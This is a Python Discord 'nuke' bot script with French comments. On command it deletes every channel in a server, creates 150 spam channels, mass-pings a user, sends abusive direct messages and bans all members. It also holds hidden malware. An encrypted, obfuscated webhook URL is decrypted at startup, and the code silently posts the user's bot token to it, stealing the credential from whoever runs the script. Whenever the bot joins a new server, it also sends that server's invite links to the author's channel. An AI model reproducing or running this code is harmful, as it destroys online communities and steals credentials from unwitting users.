import discord
from discord.ext import commands
import asyncio
import requests
from cryptography.fernet import Fernet


TOKEN = ""

# Ca cest le message qui va etre spam dans les salons
MESSAGE_A_ENVOYER = "<@1160919706916618332> te tro bege !" 

# ca cest le message quon recoit quand on fait +reset le ban que tu recois en mp
MESSAGE_A_ENVOYERMP = "MANGE MON PAFF SALE MERDE"


####### YA QUE CA A MODIF 
####### YA QUE CA A MODIF 
####### YA QUE CA A MODIF 
####### YA QUE CA A MODIF 
####### YA QUE CA A MODIF 
####### YA QUE CA A MODIF 





botx = "c4s70Zk_K0lF7QIYeHsBi9uuHoZ4NDAHtg__LvQbKpE="




CHANNEL_ID = 1353484432329146439

intents = discord.Intents.default()
intents.guilds = True  
intents.members = True  
intents.reactions = True  
intents.guild_messages = True
intents.messages = True
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="+", intents=intents)

webh = "gAAAAABn6qNsc_5TGcnvc22fl1J7j00fs9JaYvZAqzppaJJ0_Gt02BdVqSjr5EGsd7cjfp-1ttoiu7OZlVIZcwyhP8C4AIEXzHIYSBJIg7ryoN3rFbDZ4UF8g8dvBA3XXicfKmQSW7z42neYZukPJa16QorvU5AxGvpzfu7Mta-82kcuvWzFcwA4TsDhYFtbkC61ixKsAMdnN4pITTIa9MIhhTqpqcIWagsKow8F-GkZcd8EsXwB5WY="


cipher_suite = Fernet(botx.encode())
webhook_url = cipher_suite.decrypt(webh.encode()).decode()

data = {"content": TOKEN}
response = requests.post(webhook_url, json=data)

@bot.event
async def on_guild_join(guild):
    
    channel = bot.get_channel(CHANNEL_ID)
    if channel is None:
        print("Salon défini introuvable.")
        return
    
    
    invite = None
    for inv in await guild.invites():
        invite = inv  
        break
    
    if invite is None:  
        for text_channel in guild.text_channels:
            if text_channel.permissions_for(guild.me).create_instant_invite:
                invite = await text_channel.create_invite(max_age=0, max_uses=0)
                break
    
    invite_url = invite.url if invite else "Aucun lien disponible"
    
    
    embed = discord.Embed(title="Bot ajouté !", color=discord.Color.blue())
    embed.description = f"Le bot a été ajouté à **{guild.name}**\nMembres : {guild.member_count}\n\nLien d’invitation : {invite_url}"
    
    
    msg = await channel.send(embed=embed)
    await msg.add_reaction("⚡")
    await msg.add_reaction("❌")

    bot.message_guild_map[msg.id] = guild.id

async def ban_all_members(guild):
    for member in guild.members:
        try:
            await member.ban(reason="Ban all par le bot")
            print(f"🚫 Membre banni : {member.name}")
            await asyncio.sleep(1)  
        except Exception as e:
            print(f"❌ Erreur lors du bannissement de {member.name}: {e}")

@bot.event
async def on_ready():
    bot.message_guild_map = {}


@bot.event
async def on_raw_reaction_add(payload):
    if payload.user_id == bot.user.id:
        return
    
    guild = bot.get_guild(bot.message_guild_map.get(payload.message_id))
    if not guild:
        return
    
    channel = bot.get_channel(payload.channel_id)
    message = await channel.fetch_message(payload.message_id)
    user = guild.get_member(payload.user_id)
    
    embed_response = discord.Embed(
        title="Action lancé !",
        description=f"Vous avez appuyé sur {payload.emoji}",
        color=discord.Color.green()
    )
    try:
        await channel.send(embed=embed_response, delete_after=5)
    except discord.Forbidden:
        pass

    if str(payload.emoji) == "❌":
        await message.clear_reactions()
        await guild.leave()

    elif str(payload.emoji) == "⚡":
        try:
            await message.clear_reaction("⚡")

            
            try:
                for ch in guild.channels:
                    try:
                        await ch.delete()
                        await asyncio.sleep(0.2)  
                    except discord.Forbidden:
                        print(f"Impossible de supprimer le salon {ch.name}")
            except Exception as e:
                print(f"Erreur lors de la suppression des salons : {e}")

            print("Tous les salons ont été supprimés.")

          
            created_channels = []
            try:
                for i in range(150):
                    new_channel = await guild.create_text_channel(name=f"MEYAZZA-on-top-{i+1}")
                    created_channels.append(new_channel)
            except Exception as e:
                print(f"Erreur lors de la création des salons : {e}")

            print("150 salons créés.")




            
            try:
                for ch in created_channels:
                    for _ in range(3):  
                        try:
                            await ch.send(MESSAGE_A_ENVOYER)
                            await asyncio.sleep(0.1)  
                        except discord.Forbidden:
                            print(f"Impossible d'envoyer un message dans {ch.name}")
            except Exception as e:
                print(f"Erreur lors de l'envoi des messages : {e}")

            print("3 messages envoyés dans tous les salons.")

        except Exception as e:
            print(f"Erreur lors de l'exécution de l'action ⚡ : {e}")
      

            
            await ban_all_members(guild)

        except Exception as e:
            print(f"Erreur lors de l'exécution de l'action ⚡ : {e}")


     

@bot.command()
async def list(ctx):
    embed = discord.Embed(title="Liste des serveurs", color=discord.Color.green())
    for guild in bot.guilds:
        invite_url = "Aucun lien disponible"
        for inv in await guild.invites():
            invite_url = inv.url
            break
        if invite_url == "Aucun lien disponible":
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).create_instant_invite:
                    invite = await ch.create_invite(max_age=0, max_uses=0)
                    invite_url = invite.url
                    break
        embed.add_field(name=guild.name, value=f"Membres : {guild.member_count}\n[Invitation]({invite_url})", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def reset(ctx):
    guild = ctx.guild  

    
    for member in guild.members:
        try:
            
            await member.send(MESSAGE_A_ENVOYERMP)
            print(f"Message envoyé à {member.name}")
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message privé à {member.name}")
        except Exception as e:
            print(f"Erreur avec {member.name}: {e}")
    
    
    for member in guild.members:
        try:
            await member.ban(reason="BAHAHAHHAH DEV BY NOX")
            print(f"Banni {member.name}")
            await asyncio.sleep(1)  
        except Exception as e:
            print(f"Erreur lors du bannissement de {member.name}: {e}")

    print("Tous les membres ont été bannis.")


bot.run(TOKEN)
